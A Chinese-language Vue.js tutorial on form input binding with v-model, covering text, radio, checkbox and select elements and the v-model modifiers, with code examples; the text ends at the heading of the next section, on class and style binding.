---
title: Vue 基础 - 表单、样式绑定，条件、列表渲染、指令
date: 2023-10-24
sidebar: "auto"
categories:
  - vue
tags:
  - vue
publish: true
---

# Vue 基础 - 表单、样式绑定，条件、列表渲染、指令

从本节内容开始学习 Vue 的核心基础内容，主要有：

- 表单输入绑定
- class 类 与 Style 样式绑定
- v-if 条件渲染
- v-for 列表渲染
- 其他内置指令：v-text、v-html、v-once、v-cloak、v-pre 指令

本章节的内容同上一章节一样，非常的重要，针对所讲的每一个知识点都需要熟练掌握。

## 一、表单输入绑定

在实际开发中，我们经常需要收集表单中的数据，本小节的核心就是学习如何收集表单中数据。

> 我们会从以下几个点展开学习：

- 数据绑定的两种形式：双向数据绑定与单向数据绑定

- 手动实现`<input>`元素双向数据绑定

- `v-model`指令的基本实现原理

  `v-model`的基本用法

  - 收集多行文本内容
  - 收集单选按扭内容
  - 收集复选框内容
  - 收集下拉列表内容

- `v-model`指令修饰符

### 1、数据绑定的两种形式

数据绑定分为以下两种形式：

- 单向数据绑定
- 双向数据绑定

### 1.1、单向数据绑定（v-bind）

- 单向数据绑定是指：数据只能从 data 流向页面。

> 当我们更新`data`中数据时，页面中对应的数据也会跟着发生变化。但页面中数据发生变化时，`data`中对应的数据并不会有任何变化

- `v-bind`指令属于单向数据绑定，用于给元素动态的绑定一个或多个属性

**代码示例**

```vue
<script>
export default {
  data() {
    return {
      text: "用户名",
    };
  },
};
</script>

<template>
  <!--
        v-bindr指令（简写成 :）动态绑定元素的value属性，他属于单向绑定
        所以当data中数据发生变化时，页面中数据会同步更新，
        但页面中数据发生变化时，data中数据不会变。
	-->
  <input :value="text" />
</template>
```

![image-20230505214700831](https://www.arryblog.com/assets/img/image-20230505214700831.94052623.png)

### 1.2、双向数据绑定（v-model）

- 双向数据绑定是指：数据不仅能从 data 流向页面，还可以从页面流向 data

> 在处理表数据时，当`data`中的数据发生变化时，表单中的内容也要同步更新。当输入框中的内容发生变化时，`data`中的数据也要跟着更新为最新的。

- `v-model`指令为双向数据绑定，常用于动态绑定表单元素的属性（如：value 属性）

**代码示例**

```vue
<script>
export default {
  data() {
    return {
      text: "用户名",
    };
  },
};
</script>

<template>
  <input v-model="text" />
</template>
```

最终渲染后效果如下图

- 当修改 data 中 text 属性的值时，页面中文本框中的内容也会发生变化
- 当修改输入框中的内容时，data 中 text 属性的值也会同步发生变化。

![GIF2023-5-521-50-08](https://www.arryblog.com/assets/img/GIF2023-5-521-50-08.98f7e8a7.gif)

### 2、手动实现 input 元素双向数据绑定

如果没有`v-model`指令，我们用前面学过的`v-bind`指令与`@input`事件也可以轻松实现`<input>`元素的双向数据绑定。

**实现原理：**

- `v-bind`指令用于实现将`data`中数据呈现到输入框中，当`data`中数据发生变化时，文本框中内容同步变化
- `@input`事件绑定，用来实现当输入框中的内容发生改变时，将输入框中的内容赋值给到`data`中对应的属性

**代码示例**

> 使用`v-bind`指令与`@input`事件，实现`<input>`元素的双向数据绑定

```vue
<script>
export default {
  data() {
    return {
      text: "用户名",
    };
  },
};
</script>

<template>
  <!--
        v-bind 指令动态绑定输入框的value属性，当text属性值变化时，文本框中的内容发生变化
        @input事件用于在输入框内容改变时，把data中的text属性值更改变文本框中的值
        以上两部实现了v-model的双向数据绑定效果
	-->
  <input :value="text" @input="(event) => (text = event.target.value)" />
</template>
```

> 以上代码，最终渲染后效果如下图：

![GIF2023-5-521-50-08](https://www.arryblog.com/assets/img/GIF2023-5-521-50-08.98f7e8a7.gif)

总结：

如果没有`v-model`指令，我们利用`v-bind`与`input`事件也可以实现`<input>`元素的双向数据绑定。

而`v-model`指令，帮我们简化了`v-bind`指令与`@input`事件结合的复杂操作，以后我们需要实现双向数据绑定时，只需要使用`v-model`指令即可。

### 3、v-model 的内部实现原理

`v-model`指令除了应用于刚讲的`<input>`元素，还可以应用于其它各种不同类型的**输入元素**。它会根据所使用的元素自动使用对应的 DOM 属性和事件组合：

- 单行文本`<input>`与多行文本`<textarea>`输入框，`v-model`会绑定 `value` 属性 并侦听 `input` 事件
- 单选按扭`<input type="radio">`与复选框`<input type="checkbox" >`，`v-model`会绑定 `checked` 属性并侦听 `change` 事件；
- 下拉列表`<select>`元素，`v-model`会绑定 `value` 属性 并侦听 `change` 事件

如果你有兴趣，你可以参考上面 **《`v-bind`与`input`事件实现`<input>`元素双向数据绑定》**，自已利用`v-bind`指令和表单元素的相关事件，实现其它表单元素的双向数据绑定效果。

> 这里我们就不再一一讲解，我们的核心在于学习`v-model`的基本用法，内部原理作为了解即可。

### 4、v-model 的基本用法

`v-model`可以用于各种不同类型的**输入元素**，实现双向数据绑定。如：

- 单行文本 （前面已学过）
- 多行文本
- 单选按扭
- 复选框
- 下拉列表

### 4.1、多行文本

多行文本框的绑定方式和原理与单行文本框`<input>`的是一模一样。

> 写法如下：

```vue
<script>
export default {
  data() {
    return {
      message: "多行文本框",
    };
  },
};
</script>

<template>
  <textarea v-model="message"></textarea>
</template>
```

> 最终渲染效果如下：

![GIF2023-6-1516-11-39](https://www.arryblog.com/assets/img/GIF2023-6-1516-11-39.84501ded.gif)

### 4.2、单选按扭

想要收集单选按扭的选中的值，需要在单选按扭上添加`value`属性，这样`v-model`指令后的变量才能收集到选中按扭的值。

**代码示例**

```html
<script>
  export default {
    data() {
      return {
        /*
            一开选中粉色主题，则skinTheme的值为 pinkTheme
            一开始选中蓝色主题，则skinTheme的值为 skyblueTheme
            一开始没有任何一个被选中，则skinTheme的值为 "" 
        */
        skinTheme: "pinkTheme",
      };
    },
  };
</script>

<template>
  <h3>皮肤主题：{{ skinTheme }}</h3>
  <input type="radio" v-model="skinTheme" value="pinkTheme" /> 粉色
  <input type="radio" v-model="skinTheme" value="skyblueTheme" /> 蓝色
</template>
```

> 最终渲染效果如下：

![GIF2023-5-615-25-34](https://www.arryblog.com/assets/img/GIF2023-5-615-25-34.a968ac52.gif)

> 也可动态绑定单选按扭 value 的属性值

```vue
<script>
export default {
  data() {
    return {
      pink: "pinkTheme", // 粉色主题
      skyblue: "skyblueTheme", // 蓝色主题
      skinTheme: "pinkTheme",
    };
  },
};
</script>

<template>
  <h3>皮肤主题：{{ skinTheme }}</h3>
  <input type="radio" v-model="skinTheme" :value="pink" /> 粉色
  <input type="radio" v-model="skinTheme" :value="skyblue" /> 蓝色
</template>
```

> 最终渲染效果和前面一样，如下：

![GIF2023-5-615-25-34](https://www.arryblog.com/assets/img/GIF2023-5-615-25-34.a968ac52.gif)

### 4.3、单一复选框

- 针对只有一个复选框的情况，我们通常需要收集的是布尔值：`true`或`false`。 比如：对于阅读的协议只需要勾选同意或不勾选。
- 针对单一复选框，我们要收集的是布尔值，则`v-modle`绑定的变量只能是布尔类型。

```vue
<script>
export default {
  data() {
    return {
      checked: false, // false表示未选中 true表示选中
    };
  },
};
</script>

<template>
  <div>{{ checked }}</div>
  <input type="checkbox" name="sex" v-model="checked" /> 同意
</template>
```

![GIF2023-5-614-16-20](data:image/gif;base64,R0lGODlh7wBXAHcAACH5BAAoAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAA7wBXAKf/+/8AAADu7u7n/v8AVaWLiou7vLtCRUJ2dnb//8aEAADnplL19fWlVAD//ufc3NzG//+YmJgAAISl4/8AAFJSAAD/46X/x4T//vf3/v8YAACEx/8AABj//87O/////u///d4AGCkpGADv/v/epFrWmlJ7uu97e3ve///W8/8AgsYAACGjo6P/7LW0tLSEOAC17P/G8/8pQULv8///9L3/88YAdb1Spuf/9O8YXZyURUJ7vPf/663/571rtO/nqlrnrGPenkqMnsbvsmuXl5e1ioyGhoasrKy1aQCl1/eMMACtYQCMinuUw+/emkKc3f/GggAAOIzv7/fj4+Pn7fdKGADO5+8ASZzn/+cAOIT/89ZzGABrSSH/7NYAMIxrGAB7aUoAGIQAGGtCRZQ5JAAAADkAGFpCcbUAJEohSXM5AABrfYwYLEIYQWPExMSUy/+9z96Mz///9c6Mos6Uqtbn/+/v/+eUtt737+eEx/eMvu+9vq33z4z3y4TOy+/G3/fO4/fO7//vy5zez73vy6X/25zWz9b/27X3z5T/x4z315z/y5Tv79a13/+t6//v3873486tz+e11++t3//Gvr3WppTW7+/WtqXGnoy95//WroTOrpwAUZxKaXsYQYQYVaUYTYxCYXNCQSljOCF7XTFCRWNCRVIYhs5jdYw5gsZKhr05jsZjZZQAabUAYa0Yeb1CZZQ5YYx7MAAAAGMAGEIAGHM5YXMYQXMAAEIAADEYABgAJDkpGBghAAB7GABjAABjLBhzMAB7JABCOCFCGABKAABaAABaLBhKJACtglqMinOtcXPOhhi1kmO9ilqEfVK9dRi9dQClcUKMfWuMdWP3vnv3unPesmuMirWUioyMipzGhkLOjjHGgjnWpmvWnmPGjmulXRhjsudjru9jkq1rsudrkr1Sot5apt5aqudKnt6MOABSir2EVSmMVSFzioyMTRicUQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI/wABCBxIsKDBgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIsaPHjyBDihxJsqTJkyhTqlzJsqXLlzBjypxJs6bNmzhzbuxCycAfhx8ESNFJtOjJD9s0BAigwuGCAAQGGJ1KteNTWuT20HEKVWrVr2AldlASYFzEp1HDql2rkIcxChPOdmVLty4ACxXgyk1rty9YvHoN4hAgYIZBtF4HYiAsIMPBxYX9SkZ5YanlAHo/aDp2Oc0kgogHakkmwnKIcgQdOCu9NE2SybBFVr6MOW7lEKEKTEMWQAyMgaEBdHgRAM2aAmBE3BgoB16AXaiYcAlQJk/s6x8Bxx2YiF3iGrICqP8DPhfA0ywxBn6gIhADtAA5UrQvESCKB+z4NWpf6CRAqxECBQcFUwgVUswsjhA0Vi5x5OegRfslhAF9fAUXRABmbFdQfzY4plg0ASz34IgRRTiQA5tQcwBr5QVHgzABcACLJAR9gEQAbByg445kBHAKiUA6ZCIAfFSxFBulvENKi+UBoIU0SgXQRhMCOdAAbbQ1FeSWCZnYwhccqJJYcMEN1EUzxMSYDgAOLBHAKozFGRmXdBZk4g8BXIECaEzyVRAI4QTgxX3MBNBhnYgqZOJThwr0gZsVNllQZRJAAEA1GviW6KYG3RlALb8JRIJSkfJ1iXwDASHofR2sAx+qAvX/MAendXr5RXFrSGfGM316BcUKthSAXC8r+DAQIkaG0EkByoxCIK1cDqkIMJbdkgSZ5ZHAopRUEtSDO5etEEsm0JYLAB6GsOfQYoNYMRRCODwCR2Pm1mvvvfjmq+++/Pbr778AByzwwAQXbPDBCCessF9D8LLDwjG5UQACFFdsMQInsCCAQyAUIezHIIcMMjZ7KkTDFnpC7JIBCLBgwMswx2yACycYwUBDCSiA5c60VSpQBzrsKPQBZHAgw9A6jnGfyiIxgMARDU2BgAs4K8CJJQIwQJjWWW+9NSPx+Cxc0AeIosvRSB8wjNFJL800SA8g8IBDRERQtZ8LWSk2QUBo/wBKIAbV8MIK4rxdUtxzNxSB3QzljLdCeltq0DVqpOKhQIKXYYLhh8vt0OJ3Y3Elz5YRILrPT5Gu+lIics4R4p8zvpDjdWAisshC2NGAz5DI7PvvMQPiekewKy67Qo4nlvfukg+kNQPPR5919JcP/7rnxt+tPOTMEzTb6pZtYL1HxTMEeuMKpNXx7QUIAWDk3gdggpz0C0Cf+ONfn7j5xyeUPAA541la4DeQysyPawj02v3yp7/YaQ+A6QPQiRowwO4VEHyXwR8DM1K+hZxvdumTyv8mWMG9AaAyGkzIU1K4QYt0UCEfRF4IIYg3K5WweSeUX/3ktMAWYuSFCanbA/9HWCUKSoWAAvkeBlnoQ4o8LWpTG6LOdnZDgiziAHpAoCBYYYUEeuMAb2giRljmMuC9jGY2k2II0naGI1oQA+C4QwbgN6r4CAQHAALBMjQkRopI7GKAzNjGpPi41FiQB79wxQgIOKpP7MkaIdhBH9SAnj7OhIjLE1sQOPAwAmKgEo0QCDdw8QQAjMoT6bEkTDBpkEECoAVbCMN9aOAL+wDARhQoZUFaEIwwWAoD3eDAOVS5yhkiBASjs8wrHHOIdhhLIEOIEpY4gI6BgMAPxIQJ0NqokG/syBTm2B5BCJENkWkjEtlMpzrXyc52uvOd8IynPOdJz3ra8574zKc+98kbz376858ADahAB0rQghr0oAhNqEIXytCGJiwgACH5BAEeAAAALAgAJwATABIApAD/AE9PT9DQ0Hl5eaenp1ZWVqGhoX19fWNjY7Ozs+/v7+Xl5dvb24KCgldXV2lpaZSUlJ2dnYmJifX19QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVjIAAkT2CeaFBIi2gUjUEQMj3LUYEoQACJwGCQETAICgKhEjgYCALJpbJ5jEqDVORVSIVusU7tV5S1fg9O7xiArq4B5XdbPR4c3Gv7xLdmFAwABAENM4WGMxEOOyIkKY4OLAAhACH5BAEKAAAALAgAJwATABIApAD/AI2NjeHh4aioqJGRkcDAwMbGxs7Ozq6urujo6Pj4+LOzs5qamrq6up6envX19e7u7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVlIAAcTGCeaEAsiVgES1EcMj3LBcE8StCIwGAwESgIAgKhEjgYHJNLZVNAgEaD0+pVOEVusU7tV4QIW7/Z8zY9Fg0QVPWV3e7Ko+/eb5wgFAAGAQgGhIWGBjkMCiIHDikpBCsQACEAIfkEAUYAAAAsAgAHADQAMgCnAP8A//v/AFzIAAAAAACExv//QIXWAFWlv9bxhAAA///G5///7+/vMHvS56ZSUgAA/+Ol8PX8EGbL///37/P/oMLrQkVChMf/hMv///vnS4zY9/v/z+D1///O0OH1jM//zv//3On3cKTgYJndAILGIHDP1vP/3vv/jIpzpVUAjbbmvev/jDAAydzz/+et/+e9///vYyQAGF2cAAAxAAAYHG7OAHW998eEvff/AAAh/9uc79e198+U99ecGAAAGCxCvc/eIUlzhMf3SgAAACRKrev/tev/peP/pdf3ABhrKRgA79/O5+/3AABSACQ5OQAA///eOSQA7+/e//POzsfW//Pv//e9AABzAAA5ABhCABgp9+/vAABjxvf/GIbOMY7OOY7GY32Ma32McwAAWiwYe773ShgAjDgAWgAAUqbnc7r3ADiEADiMAFWcSml7SklKADCEa0khYzghcxgAY3WMIUmEOWGMOW2tjE0YxoI53ppC1pZSvYpaxoIAzoYYjIqMhLa9jKLO3rJzQhgA9757pZZStWkAvXUAvXUYnEkAjFUhrV0AjHVSjIp7nHWlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACP8AAQgUGKBggIEIExIsqLChQ4cGDT5MGHGixYYRGV4EUHHjxgk7HIHwOLAjyYkQHhAocJKjxJYWV7Y0CdOhTIUGt1Cg+LJkxQkMGOx0qVGgA4UDLgBQkGAAhh4xAKxMubKigwEHFkTMwEfJgK9BkGQ8COBowqRLmwKa83WqygJWsWotOAXPACd0GsUZgEXI2IQ3BTId8ObOCYNU4Uq8mvXgBEQDZJjgOGHPADYjMyIMnHYAnC4LE8fNKlDHEC5FFnZgMePDwqJSWQ4c/OW16MVyD+oZYGPDwgmHBqR5TVYg58FqMt5myFgrDEMDfliYTj3KAC9/Bx5PAACD8rejtWb/SPG1/ACEJLIbl81xMAafyw82D5BhEQAwQfMzEEhBfeySgykV2gNNHFFRH3IJ5AdvGxxEk0NX4ABgUwIaZMUYNJQR0WoJAkCID0kY4WBPDbmARmsTokXUeAO0cVgAMOTxFWkAdHAGAJIR9UIgCBUFRSIDZBEGIx8E4N5YNzwxABFioEDGGoXkVhAPZgyghRt/oCAHAOlpRpALMXxFw3tMAXDBWAEIMsh5A9SxwnwGvaCIeTnYsYJ/AAAlVI+wDTSBFFQwwWdPVSwBBAO+eVnToow26uijkEYq6aSUVmrppZhmqummnHY6UQgaCCDqqKSOWoMKmjZQ6qqlVoBpC6yujirBqBpgikCspFbAgaoCGGArrqKOwN+svl56K64NDCSCqMVaeiyrEgxVwajNVvrsqh4I5MGszP4qagMIcOsqABGUQGq1lB7bQAQAcCCBsAIZUCq6k6rLbrvKrkqvpM+ui9C0+nr77b3bsrpvpNcKsG65sR4MacIKy9vwq8CyWiumvFY86riXgqqxAKdOGhAAIfkEAQoAAQAsCAAnABMAEgCkN5P/AP8Aaa7/zeT/Xaf/8vj/RJr/tNf/2ev/crP/5PD/1ej/pc//UKH/TZ//OZT/YKn/j8L/grz/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABWdgoCQPYJ6o6TBBAKVweiwxbJzJUKMHQpgC3Q4gaRVuwSGhFYgAhTFDoXU4JWuIFuL2PBEG3IOxgboSpttiS5AyTwPZlrMNPTMDVdjVZIdz6SlnBWQxe15sNQI0QzAJLowyIiSQKwEhACH5BAEKAAAALAIABwA0ADIApwD/AP///wAAAOf7/wBVpeemUtDQ0E9PT3l5eVZWVu/v76Xj/wAAUqenp6GhoYmJiUJFQv/79/f7/ykYAP/77xgAAP/z7//75//HhP/jpQCCxoKCggB1vf//zv/r1s7//+/z/wAAGAAAIQAYKVIAAIyKe4wwAMaCAN6iWt6aQlKm52t9jP/nvf/rtfX19bXr///zzp2dnZTD77Ozs9bz/5SUlO/v99vb2+eqWqXX9+Xl5QAYaxhBYwAYWntpSgAkShgsQmsYAGlpaUoYACFJc2tJIWNjYwAwjBhdnNa2pd7PvVosGP/bnEokAP/nrf/HjPfPjPfXnPfPlK3f/7XX73skAGM4Ib3P3nswAK3r/86unNauhMa+vWMsGLXv/73n/wAYc+f3/wAAY+fv9//z1v/73ufr9wAkOQAAOQAAMSEAAO///wAYQjkkAMbf98bz/8b//87f71oAAP/zvUIYAO/fzv/zxhhBc97//0oAANbv/zlhc4zP/4w4AIxNGIxVIQA4hGuy52u274Q4AKVVAL11AL11GIR9UrVpAK1dAKVdGK1hAGOu7wBptQBFnBiGzmN1jDlhjAB9xkJllDmOxkqe3gA4jFqq52OSrUqGvVKKvXOKjIx1Y/e+e0ppe0Jhc+eqY96eStaWUtaaUkJFY4yizpSq1oTH972+vVdXV3tdMb2+ra2CWr2KWrWSY4x9a6VxQoyKcwAAhM6GGMaGQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj/AAEIFOiBCyo3AxMqFGhBgY2FECNGpECrggABGiQqLCCAwACNICFyZINplamQAjl6RMmygwkBjFgOVPlRJkgnchgssAmAJs+QOnn6/Kkx6MKGCkAE2Nix5sAICqJKABCg6lIAUJMmxLAwKIUtSy4KAEBkitUAPquSYTVB7IhAZy+0anuRSA6BXBUGxSBgxKcHr5oI2PHCaloYgwT8WPHAxwQVVmH4EXAGUokiAtCc0rtz4BNNA6zawSKgkuGmVDkCekM1AAUzSyMYEoCERmxRAix9SGhU4NmrKQQ0WlM17QkBknxbFcgkj5gsVQW6TMOHd2fl0bGOalocdYBQAnrs/zwrMDgHCdkjFBKgwnrCABe0cIJAlzta73OqCAgxicpZCogIAAQEBBbYhgCPuDcQFEMAICApm6hiX1oBeACLRQLwIENVFxCSkFhiZTRQby0EEUImYcw0oXdWeeAKHQCEcAl8iQhAiUBR5ajViNfhIIAjeFzV04orkQdAGYoIcMRuswhwHlDXcXTeVRQsQmRoRgbAlyxwANBJBYRplAEJvfkIhhdXoWCRR92xGUASelwVACgALAlAB33QRkNCLJQy0Jg6WVWiYitc1sMhV1Z1ggh7PNCYGiIIYpUUDY7gyQOxWIHRn2QusFwUXTgowB050FQcAG6iUF+GG57Fwh8giuIQyRcKGcmQAWNAZCtVCigRx0PYRWdBHVcoMBVRyCar7LLMNuvss9BGK+201FZr7bXYZqstSAHMIMQB4IYr7gEJPKDDtQ4ksIEDDTTArrvtshtDAkYoUK0LB9Tw275V3XCAA9UakIAB/PKLAAIBH0BwwXIGcHDAAzM8UFUPUyvwwvxiV/G0BihccLAbS3txxq1ZFXK0Iy+1XLAOI2yxx3JO/NvJ0KYsZMln0fyszQ3vq7OzHWPMMMUucxzx0CZvcG++SPf7r7UOHLABvFS/60AMqdRrbbdCJECu1wmA/bW50AYEACH5BAF4AAAALAgAJwATABIApAD/AHZ2dpiYmLu7u9vb23l5eXt7e7Ozs/Pz8+Pj44aGhsTExIuLi+rq6qOjo6ysrP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVVIAAsTGCeaGA4jTgEwiDP9HAYCoIEj+j/v0TgQCgQgEifQFA8JpHL5hPKNE6BUetVWXVuAVnvNvwVkcvnb3rMDIivSwivLDwAXrFa7ZYTkQopKSstIQA7)

- 如果我们希望复选框选中时与未选中时分别给出不同的值，并且值可以为非布尔值
- 则可以在复选框上添加`true-value`和`false-value`两个属性，这两个属性是 Vue 特有，仅支持和`v-model`配套使用。

```vue
<script>
export default {
  data() {
    return {
      skin: "skyblueTheme", // 默认主题
    };
  },
};
</script>

<template>
  <h3>皮肤主题：{{ skin }}</h3>
  <!--选中皮肤主题为：pinkTheme  未选中采用默认主题 skyblueTheme-->
  <input
    type="checkbox"
    v-model="skin"
    true-value="pinkTheme"
    false-value="skyblueTheme"
  />
  粉色
</template>
```

![GIF2023-5-619-19-46](https://www.arryblog.com/assets/img/GIF2023-5-619-19-46.5094b375.gif)

- 也可以使用`v-bind`来动态绑定`true-value`和 `false-value`属性的值

```html
<script>
  export default {
    data() {
      return {
        skin: "skyblueTheme",
        skyblue: "skyblueTheme", // 蓝色主题
        pink: "pinkTheme",
      };
    },
  };
</script>

<template>
  <h3>皮肤主题：{{ skin }}</h3>
  <input
    type="checkbox"
    v-model="skin"
    :true-value="pink"
    :false-value="skyblue"
  />
  粉色
</template>
```

### 4.4、多个复选框

- `v-model`收集的是被选中的多个复选框的值时，默认将收集到的多个值放到一个数组中保存。所以`v-model`绑定的变量需要是一个数组。默认没有一个被选中，则变量对应的是一个`[]`空数组。
- 收集时，要知道每个复选框的值，则需要在复选框上添加`vaule`属性。

```vue
<script>
export default {
  data() {
    return {
      hobbies: [], // 默认没有被勾选的项
      // hobbies: ["桃子"]  // 默认桃子被勾选
    };
  },
};
</script>

<template>
  <h3>你喜欢的水果有：{{ hobbies }}</h3>
  <input type="checkbox" value="苹果" v-model="hobbies" />苹果
  <input type="checkbox" value="香蕉" v-model="hobbies" />香蕉
  <input type="checkbox" value="梨子" v-model="hobbies" />梨子
  <input type="checkbox" value="桃子" v-model="hobbies" />桃子
  <input type="checkbox" value="菠萝" v-model="hobbies" />菠萝
</template>
```

![GIF2023-5-614-14-56](https://www.arryblog.com/assets/img/GIF2023-5-614-14-56.f645b330.gif)

### 3 4. 5 、 下拉列表： 单个选择器

如果下拉列表为单个选择器，也就是每次只能选择下拉列表中的一项。

- `v-model`指令后变量 为一个字符串类型，用来收集选中的`<option>`元素的`value`值，而非`text`的值。
- 不过`v-model`指令要写在`<select>`元素上

```vue
<script>
export default {
  data() {
    return {
      province: "湖南", // 表示最开始选中湖南，如果不写或写的值与<select>中的任何一项不匹配，则最终渲染效没有一个被选中
    };
  },
};
</script>

<template>
  <h3>你所在的省份为：{{ province }}</h3>
  <select v-model="province">
    <option value="湖南">湖南省</option>
    <option value="陕西">陕西省</option>
    <option value="海南">海南省</option>
    <option value="广东">广东省</option>
    <option value="湖北">湖北省</option>
    <option value="河南">河南省</option>
  </select>
</template>
```

![GIF2023-5-614-40-18](https://www.arryblog.com/assets/img/GIF2023-5-614-40-18.07a0d188.gif)

注意事项：

- 如果 `v-model` 表达式的初始值不匹配任何一个选择项，`<select>` 元素会渲染成一个“未选择”的状态。
- 在 iOS 上，这将导致用户无法选择第一项，因为 iOS 在这种情况下不会触发一个 change 事件。

> 因此，我们建议提供一个空值的禁用选项

**代码示例**

```vue
<script>
export default {
  data() {
    return {
      province: "",
    };
  },
};
</script>

<template>
  <h3>你所在的省份为：{{ province }}</h3>
  <select v-model="province">
    <option value="" disabled>----选择你所在省份----</option>
    <option value="湖南">湖南省</option>
    <option value="陕西">陕西省</option>
    <option value="海南">海南省</option>
    <option value="广东">广东省</option>
    <option value="湖北">湖北省</option>
    <option value="河南">河南省</option>
  </select>
</template>
```

![GIF2023-5-614-44-51](https://www.arryblog.com/assets/img/GIF2023-5-614-44-51.4a1bab36.gif)

### 4.6、下拉列表：多选择器

如果下拉列表为多选择器，也就是每次可以选择多个列表项。

- `v-model`指令后变量的类型为一个数组，用来收集多个`<option>`选项的`value`值，而非`text`的值。
- 默认刚开始没有选中任何一项，则`v-model`指令后变量的值为一个`[]`空数组

**代码示例**

```vue
<script>
export default {
  data() {
    return {
      // fruit: ["苹果"]  默认选中苹果
      fruit: [],
    };
  },
};
</script>

<template>
  <h3>你喜欢的水果：{{ fruit }}</h3>
  <select v-model="fruit" mulle>
    <option value="苹果">苹果</option>
    <option value="香蕉">香蕉</option>
    <option value="草莓">草莓</option>
    <option value="橘子">橘子</option>
    <option value="樱桃">樱桃</option>
    <option value="菠萝">菠萝</option>
  </select>
</template>
```

![GIF2023-5-615-09-12](https://www.arryblog.com/assets/img/GIF2023-5-615-09-12.cfa4f948.gif)

### 5、v-model 指令修饰符

为了方便收集表单中的数据，Vue 为`v-model`指令提供了以下 3 个修饰符。

| 修饰符    | 功能                                                                                                             |
| :-------- | :--------------------------------------------------------------------------------------------------------------- |
| `.lazy`   | 默认情况下，`v-model` 会在每次 `input` 事件后更新数据，添加了`.lazy`修鉓符后会改为在每次 `change` 事件后更新数据 |
| `.number` | 可以让用户输入的内容自动转换为数字，不加`.number`修鉓符，内容默认为字符串                                        |
| `.trim`   | 自动去除用户输入内容两端的空格 画画 跳舞 唱歌                                                                    |

change 事件

- 在 `select` 元素上，`change`事件会在选择某个选项时发生。
- 当用于`<input>`或`<textarea>`元素时，`change`事件会在元素失去焦点时发生。

**代码演示**

```vue
<script>
export default {
  data() {
    return {
      username: "",
      age: 0,
      hobbies: "",
    };
  },
};
</script>

<template>
  <!--当input元素失去焦点后，更新msg变量的值-->
  <div>姓 名：<input v-model.lazy="username" /> {{ username }}</div>

  <!--最终age的值为数字类型-->
  <div>年 龄：<input v-model.number="age" /> {{ typeof age }}</div>

  <!--如果输入的内容前后有空格，会自动去除-->
  <div>
    爱 好：<input v-model.trim="hobbies" /> {{ hobbies.length }}--{{ hobbies }}
  </div>
</template>
```

![GIF2023-5-617-33-07](https://www.arryblog.com/assets/img/GIF2023-5-617-33-07.2ac6638c.gif)

### 6、总结：表单输入绑定

本小节重点需要掌握以下内容

- 理解`v-bind`单向数据绑定与`v-model`双向数据绑定
- 了解`v-model`的底层实现原理
- 利用`v-model`指令收集**单行文本**、**多行文本**、**单选按扭**、**复选框**、**下拉列表**中的数据
- 掌握`v-model`指令修饰符`.lazy`、`.number`、`.trim`的作用与用法

```vue
<script>
export default {
  data() {
    return {
      userInfo: {
        username: "",
        sex: "",
        age: 0,
        hobbies: [],
        province: "",
        agreement: false,
      },
    };
  },
  methods: {
    showInfo() {
      console.log(this.userInfo);
    },
  },
};
</script>

<template>
  <form action="" @submit.prevent="showInfo">
    <!--单行文本-->
    <div>姓名：<input type="text" v-model.trim.lazy="userInfo.username" /></div>
    <!--单选按扭--->
    <div>
      性别： <input type="radio" value="男" v-model="userInfo.sex" />男
      <input type="radio" value="女" v-model="userInfo.sex" />女
    </div>
    <!--单行文本-->
    <div>
      年龄：
      <input type="number" v-model.number="userInfo.age" />
    </div>
    <!--复选框-->
    <div>
      爱好：
      <input type="checkbox" value="阅读" v-model="userInfo.hobbies" />阅读
      <input type="checkbox" value="唱歌" v-model="userInfo.hobbies" />唱歌
      <input type="checkbox" value="跳舞" v-model="userInfo.hobbies" />跳舞
      <input type="checkbox" value="跑步" v-model="userInfo.hobbies" />跑步
    </div>
    <!--下拉列表-->
    <div>
      选择所在的省份:
      <select v-model="userInfo.province">
        <option value="" disabled>----选择所在省份---</option>
        <option value="湖南">湖南省</option>
        <option value="湖北">湖北省</option>
        <option value="陕西">陕西省</option>
      </select>
    </div>
    <!--单一复选框-->
    <div>
      <input type="checkbox" v-model="userInfo.agreement" />
      同意并接受《用户协议》
    </div>
    <button type="submit">提交</button>
  </form>
</template>
```

![image-20230506190428263](https://www.arryblog.com/assets/img/image-20230506190428263.54eed7d8.png)

- 如何将表单元素绑定的值为动态数据

```html
<input type="checkbox" v-model="agreement" :true-value="xx" :false-value="yy" />
同意

<input type="radio" v-model="skin" :value="pink" /> 粉色
<input type="radio" v-model="skin" :value="skyblue" /> 粉色

<select v-model="data">
  <option :value="xxx"></option>
</select>
```

## 二、class 类 与 style 样式绑定

